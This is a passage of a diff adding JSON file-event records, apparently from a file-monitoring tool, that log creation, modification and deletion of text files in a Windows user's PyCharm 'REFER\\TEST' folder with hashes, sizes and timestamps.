+      "content_hash": "2a562c7b80f9a1e10c1ea2cb689395a0eb5f7f05244744496e609c2a3f9a3607",
+      "filesystem_hash": "8e5db4d9950800b79e90ce6a65e9725699cdfdcd3dac1700996fd2704733cc7b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 10,
+        "created": 1764400551.8339345,
+        "modified": 1765364258.930304,
+        "accessed": 1765364258.9389725,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364406,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "4490a995434fdd220edb17c029156a0e5bda81e94092cab98007fec0764ba647",
+      "content_hash": "3b475a5b08d1a54be71d8168e2d02cf1d8af7d60cb0b2b31a49fd649377bf9bb",
+      "filesystem_hash": "93a2ca0aeddddcd5fbb38fd710b77799b20175173953c5820234b66f15f1b27d",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 13,
+        "created": 1764400551.8339345,
+        "modified": 1765364406.0171824,
+        "accessed": 1765364406.0405035,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364413,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "7f0d4115576d371ac388dc204d3d099259762274b8c0e5b8319382b5dc1cbf17",
+      "content_hash": "f5ce9481dcff23cf52156699dd5c7c70580675c4bf7446058e900588d185a9c5",
+      "filesystem_hash": "5bb08e6abcf70a48df013e56518f744534cb838ae60e5beb2ea17a2e56412ab5",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 24,
+        "created": 1764400551.8339345,
+        "modified": 1765364413.211576,
+        "accessed": 1765364413.2204607,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364441,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "130caeee8ad23109b6805f0cc3638aaeb186065b0d60d059097306fa43cae629",
+      "content_hash": "81b637d8fcd2c6da6359e6963113a1170de795e4b725b84d1e0b4cfd9ec58ce9",
+      "filesystem_hash": "2179ac82785ecc5c48f492a1741eca8923facda575ce33a7673febcca6a1f161",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 3,
+        "created": 1764400551.8339345,
+        "modified": 1765364441.1699755,
+        "accessed": 1765364441.1699755,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765365664,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "739dd7837dfeb47d08d98a0c7b68e94842355d693327345124931537e2fa4cc0",
+      "content_hash": "37fe9a12c78bc144ea5eecce3de21b396f19b462a359b19c3291d1d161d95ea6",
+      "filesystem_hash": "8af43464406f06ff673b792f5a028b3c2ff19ff8984fa09b3bcdb1d33296074f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4,
+        "created": 1764400551.8339345,
+        "modified": 1765365664.232049,
+        "accessed": 1765365664.232049,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765365678,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "7cb5dcc05f675e57f7062302e262cf424c4b272a59662c9fc8fb79a9e48a375b",
+      "content_hash": "4c40aa978b4e39046070342d879a4db1a7f0975e5647b39c686b2fd256c8b13a",
+      "filesystem_hash": "da4f80cba8c5efb330f3a8d40511560092484b73cae48c6df474c76f2082407f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 8,
+        "created": 1764400551.8339345,
+        "modified": 1765365678.4387875,
+        "accessed": 1765365678.4491243,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765365685,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "9e201200318f2730c8604d82f4535a5c3d04ab2d6c84bb5becf8bc93c8ce35b4",
+      "content_hash": "12998c017066eb0d2a70b94e6ed3192985855ce390f321bbdb832022888bd251",
+      "filesystem_hash": "5af71d31af3a2daebec3564db8b687c86640573535c9cb937338459e3bdc54f6",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 11,
+        "created": 1764400551.8339345,
+        "modified": 1765365685.1340127,
+        "accessed": 1765365685.1411786,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765366530,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "b32493d120a72997c2feebf00eff62573ce82c9b25fef15e8f3d2da7218d80b2",
+      "content_hash": "05f6ec6000465b6c30642604b6bfc02cc4f6d01139b480972d2e67f162355c01",
+      "filesystem_hash": "bb2911b582bbbf45aae24f0809d1f05f7d0ca996881a2f405a13f9819705c355",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 15,
+        "created": 1764400551.8339345,
+        "modified": 1765366530.6926093,
+        "accessed": 1765366530.73408,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765366973,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "a03a8ad32dc824b3290192ef791db9319680f9c923ae73988ab97f3e47e0c2de",
+      "content_hash": "4393699fca8eab41fe3d10d024cf4f4fafeb3ddc98c97eaf83f97f1899563bb0",
+      "filesystem_hash": "5094e04fbae01f10ecfe7a74db38c6d4158fd42a518be5f6dc02ba013f99c470",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 18,
+        "created": 1764400551.8339345,
+        "modified": 1765366973.2843556,
+        "accessed": 1765366973.2931273,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765367674,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "a401f42ea81778e7685d866d8ba94ec177a0e9db01b6d7b872c2ae0fb54ec042",
+      "content_hash": "9b96a1fe1d548cbbc960cc6a0286668fd74a763667b06366fb2324269fcabaa4",
+      "filesystem_hash": "88f41440e2a1e5e51b1dbfa0787e2da234adc7bbdc3a430ca4b095516eed65f9",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 8,
+        "created": 1764400551.8339345,
+        "modified": 1765367674.3483093,
+        "accessed": 1765367674.3570497,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765368814,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "3f2b8cc15ec7014e9828ebbbde13789e3692485ba40863cec26841267539ffaf",
+      "content_hash": "a4262de636a85630a7d17d56178dd286b1c2ff199c38bf8e1fbeec73820455ef",
+      "filesystem_hash": "3551560534c7a77f7bf8fccc962b3bd162fb8de18fe82a9990b2b71674d5bf13",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 11,
+        "created": 1764400551.8339345,
+        "modified": 1765368814.4177568,
+        "accessed": 1765368814.447714,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765368848,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "89e8bbe88440902c7aa89e6bfaba00ba2567425148881807a47cd560c2801514",
+      "content_hash": "8a5641c6ac3d89defc5699dc84d9443ada333daa83ae0cbe24b8e40cd227e6b0",
+      "filesystem_hash": "c580a47751c127bd01e3c076ffbfd41b969f93efee775ecd3442e2723ffda352",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12,
+        "created": 1764400551.8339345,
+        "modified": 1765368848.335103,
+        "accessed": 1765368848.3607478,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765369725,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "365884faed14dbbfadb5369809022845618bb433e69339412740204bdc22966c",
+      "content_hash": "bc1115c18a06618dfb2167011a5999d45da207ff31cb65a9484ce0459bd66bee",
+      "filesystem_hash": "9491634b0e08bbe3bc10ed5e846f464f894e161f52c989399f12b492fdbfd32c",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 13,
+        "created": 1764400551.8339345,
+        "modified": 1765369725.9567168,
+        "accessed": 1765369725.9638076,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765369762,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "8b73133fd0301f28c574074a81ad42cf09335b9ea9b866616ab2f2aa76394950",
+      "content_hash": "9c0906ac02e7b173b8cbc547e620866e5267124364d034e7d28990b13e6b42d0",
+      "filesystem_hash": "563a59a633311d4cb39e86727a6426018669af271cac341667b186462ce090b1",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 16,
+        "created": 1764400551.8339345,
+        "modified": 1765369762.8692589,
+        "accessed": 1765369762.8794928,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765369767,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "70d24a88e0a19a9db386b6f5f5e701a7d371247c38710bd4423d99d4e1c70aad",
+      "content_hash": "0cf4f4a4d0644966bf2af6a9316aac05cc8950cee8d266435842fbb625b1f364",
+      "filesystem_hash": "080eed391781f8c0b12417c8d3def4f1ee064519562040efcc101649f718d17e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 17,
+        "created": 1764400551.8339345,
+        "modified": 1765369767.2539256,
+        "accessed": 1765369767.2615776,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765369781,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "4eb0793e9617ce40af3a00edcd6b0f9cb34c9b7949acee28a5ca60503ce16385",
+      "content_hash": "839ce83b5bd2a2188bb7899b39ff9f1e61d6a55e61609868850df434b0d90f12",
+      "filesystem_hash": "1f536c2a36ae2a1deb0e438774b5423218c37023c4464c21d575fa878060be95",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 18,
+        "created": 1764400551.8339345,
+        "modified": 1765369781.3723075,
+        "accessed": 1765369781.381413,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765369817,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "9ff0349ce629a167d45047918395662d884557ae8d33bc825b640ed7fd9e981c",
+      "content_hash": "280f5780f231141be26db97f628dec0ef000bdff2d60cdf55bb8a9c39f050f67",
+      "filesystem_hash": "9198959155027cdd20547a8f6a546ac6dcf996b7b3adfed8243957da5cdda429",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 19,
+        "created": 1764400551.8339345,
+        "modified": 1765369817.6867874,
+        "accessed": 1765369817.6943893,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765373229,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "21c85c2789101258fbf068dc03796971b7adb4ae337c27bfa10bc7e1f17148c3",
+      "content_hash": "ceb40597a4302328ed91a4be741437cf90eb9177996a15337977b54b70461ee1",
+      "filesystem_hash": "e977ae4ea32c2fac7c3c781ea797e541943e5ff9605625717e8bb2122bc60405",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 20,
+        "created": 1764400551.8339345,
+        "modified": 1765373229.950351,
+        "accessed": 1765373229.9613497,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765373431,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "f7494aac63a838dcc3516e3d8a7a9707909dffa23e4844024d7afcc98a84cbb1",
+      "content_hash": "81b637d8fcd2c6da6359e6963113a1170de795e4b725b84d1e0b4cfd9ec58ce9",
+      "filesystem_hash": "b2c938f4cafe4e3b64912918a0afc3ff80469b16593fdc940ea5b8ef3a838508",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 3,
+        "created": 1764400551.8339345,
+        "modified": 1765373431.026604,
+        "accessed": 1765373431.057609,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765380857,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "b336cfff5d0dd136f020a034a1c736a9c622b4159a09208fee2792cabb27d6f5",
+      "content_hash": "7daa446b81408e830de5979c926b435e85bfbfb3281e1da42f31e8297d7448a5",
+      "filesystem_hash": "ef1cba0e9cd4a36524d70dec68e7b3049aefc8083a27b058dedc2c275250464e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4,
+        "created": 1764400551.8339345,
+        "modified": 1765380857.9491556,
+        "accessed": 1765380857.9800155,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765438431,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "54465a8e101902005ffada0dd5e677735cecefcbb476a4406377da014f87cea5",
+      "content_hash": "2c7719c67a9091bbd38e77ff837e419cec23f40488c9bc0ad65836ff7c433b7e",
+      "filesystem_hash": "b5ade42120ffb2374f72cdca605a7b0fb0b8edc92595069ebbb013fdc86b6e8a",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 5,
+        "created": 1764400551.8339345,
+        "modified": 1765438431.4385228,
+        "accessed": 1765438431.446679,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765446550,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "71fde276d3ff5ca98334befc94146e8038c68d36b5c87254202ae703abb8c0c8",
+      "content_hash": "9729136b4d7bce88e710f89b677cee4c5fc0d5b88baf087bbbd1e0ba79ffea05",
+      "filesystem_hash": "1ae837d1ba04413fbdf5b898edbaa6db8cf740a24d98b234549ea657afbb0df8",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 8,
+        "created": 1764400551.8339345,
+        "modified": 1765446550.9385653,
+        "accessed": 1765446550.9676402,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765454750,
+      "event": "DELETED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\wassup.txt": [
+    {
+      "timestamp": 1765358153,
+      "event": "CREATED",
+      "file_uid": "c0f356ec-4f54-42f2-b306-91f02340c062",
+      "combined_hash": "41122f1f17aeb14a83095e477e38e9ea59071e3a1c32cdb396c07489d7087211",
+      "content_hash": "3bac2afb2345e62978ed88fc8ae3b140bb4081568923c7f5b366861b6b402d3e",
+      "filesystem_hash": "ef8d68b644dfd231fe7ee5bb1bf38ab2174b1f299987b04b80535dca5495d3e9",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 16,
+        "created": 1764406100.9620962,
+        "modified": 1765354049.497651,
+        "accessed": 1765358153.8192132,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765380770,
+      "event": "MODIFIED",
+      "file_uid": "c0f356ec-4f54-42f2-b306-91f02340c062",
+      "combined_hash": "337eb386cfff44c400fa126368fecb00dd445ac8c3b27654f33a06be5ff8dcea",
+      "content_hash": "e103ce2bde343ab7e00d8767a95158619024574e978619bfec8d8580cc8f8fa6",
+      "filesystem_hash": "12b880ab67eefb84c43c551e80b566927b968d0e2b020b988f639ce2f617424f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 17,
+        "created": 1764406100.9620962,
+        "modified": 1765380770.8490458,
+        "accessed": 1765380770.8570454,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783340,
+      "event": "DELETED",
+      "file_uid": "c0f356ec-4f54-42f2-b306-91f02340c062",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\salam fidan.txt": [
+    {
+      "timestamp": 1765446560,
+      "event": "CREATED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "633ec166ef481cb678174075ada3ac779b6293f30ea24b22f5996c42f87c97e9",
+      "content_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "filesystem_hash": "8d8fe65a45eb2174baa099b4d30af466fab540f486bc8446072dfc8512e64074",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 0,
+        "created": 1765446560.68009,
+        "modified": 1765446560.68009,
+        "accessed": 1765446560.68009,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765446562,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "e7cd50f1f51d2bb4c243ac1b6037d289ca6a8d52c9155f53ad8032a19f01ee41",
+      "content_hash": "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
+      "filesystem_hash": "237d5df53eee5339ebd2f4a054eba08569b0d12f2a81cfa776d406c3f08f0a77",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 3,
+        "created": 1765446560.68009,
+        "modified": 1765446562.2731276,
+        "accessed": 1765446562.2986376,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765454706,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "881c9049b296746e64ea6bf70719c2e0dcf5870f586e888683fec5c95fdb9696",
+      "content_hash": "96cae35ce8a9b0244178bf28e4966c2ce1b8385723a96a6b838858cdd6ca0a1e",
+      "filesystem_hash": "c08d763972235061ee4e91c6869207bb7e4eac81e88c5f89e59d900f865c4e1e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 6,
+        "created": 1765446560.68009,
+        "modified": 1765454703.1673186,
+        "accessed": 1765454706.0724452,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765461089,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "1c8c83115595ddb95f2f4037e6b053eaaff6bd6f688281560f06da8220042973",
+      "content_hash": "0cb1595397422e9ff1e47f5e1692a199d19f3c0d95cb92ceeffdab89025e6d65",
+      "filesystem_hash": "5141c474b6e1f19832e6b7e5099dd11f7df33b512730944df90ea89619538917",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12770,
+        "created": 1765446560.68009,
+        "modified": 1765461089.396398,
+        "accessed": 1765461089.4255838,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765461096,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "200b3c3a19cef13a41a3a55a0b314c038c2c6b2315760304ca9c5a31fca72b80",
+      "content_hash": "b8b0136ebd7fd27094a2d49bdf4ccde50638dc5d1151c352134a382b6214bbad",
+      "filesystem_hash": "bc36569a9297c8ff8f4351565976ff7923128bd0446101236424ddae07e5fb64",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4231,
+        "created": 1765446560.68009,
+        "modified": 1765461096.218234,
+        "accessed": 1765461096.2335968,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765461123,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "638ffa9b33e65dcc3bf09cf3a012d0da66c6af26f332e706ed0c6c362d7239c6",
+      "content_hash": "2285322441536570f2aa8728ea132c8e729a8277c2b5ecda12773c3668868abb",
+      "filesystem_hash": "46867a2128fb14f8a2c88af8e061dcadbc6dbf599fb2d13835b7b6a50399d246",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 3525,
+        "created": 1765446560.68009,
+        "modified": 1765461123.47365,
+        "accessed": 1765461123.5072443,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765461169,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "0fe922264c70009457858cad3376e14957413ea8781d7f254103d6764f70fcbf",
+      "content_hash": "dfef282de8e8b411e632297c7988b1e8519241b5c476a4c64239b58ae071850d",
+      "filesystem_hash": "33ff13eeafb9746a91b956be75ba5873b8b79a06390ef440b76f8eabd7571777",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4287,
+        "created": 1765446560.68009,
+        "modified": 1765461147.60194,
+        "accessed": 1765461169.2745407,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765461180,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "2e9b54f673aea96533e884880bd0cb50201792e8c32ffeedd65f42a4e55ab63a",
+      "content_hash": "ca6ee9c37873613d0c3c61ec47aaa1f75926f8bb0988a318bb7a2d2a93279366",
+      "filesystem_hash": "96a643f37583cd8dac216558a4b2a4810cbe8aa90e41df08173dff81cb234ae6",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4293,
+        "created": 1765446560.68009,
+        "modified": 1765461180.7230978,
+        "accessed": 1765461180.7371573,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765520817,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "88809c09d457de66b55fdcf680b77cd5ca47e2a8ad96f1d16512b1d8f80eb205",
+      "content_hash": "887bc44962dd6f7d284402a4408372485cf1c254a357a003b1f6d756f6bf8cba",
+      "filesystem_hash": "ea2303ff7fc439146c04e1307977d6c8df4122117c0214c5084a74d9c68235c9",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4294,
+        "created": 1765446560.68009,
+        "modified": 1765517330.6182625,
+        "accessed": 1765520817.3488455,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765778181,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "7828069ee0372749b43292518ce6b89e08d635cc1164a2b1d53fa71cab5b5209",
